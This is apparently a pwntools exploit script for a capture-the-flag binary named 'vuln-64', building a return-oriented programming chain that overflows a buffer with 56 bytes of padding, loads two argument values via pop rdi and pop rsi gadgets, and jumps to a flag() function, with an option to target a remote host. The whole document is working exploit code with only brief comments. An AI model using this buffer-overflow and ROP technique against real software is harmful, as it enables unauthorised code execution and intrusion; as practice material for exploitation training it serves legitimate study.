from pwn import *

#REMOTE = True				# test remote
REMOTE = False				# test local

elf = ELF("./vuln-64")

if REMOTE :
#	p = remote('10.10.10.147',1337)	# test remote
	p = remote('',1337)		# test local
else:
	p = process('./vuln-64')

POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9

payload = b'A' * 56		# Junk up to EIP
payload += p64(POP_RDI)		# pop rdi; ret -> edi ; arg1
payload += p64(0xdeadc0de)	# value into rdi/edi -> first param
payload += p64(POP_RSI_R15)	# pop rsi; pop r15; ret -> esi ; arg2
payload += p64(0xc0ded00d)	# value into rsi/esi -> second param
payload += p64(0x0)		# value into r15 -> not important
payload += p64(0x40116f)	# Address of flag()
payload += p64(0x0)

#print(payload)
p.recvline()
p.sendline(payload)
p.interactive()
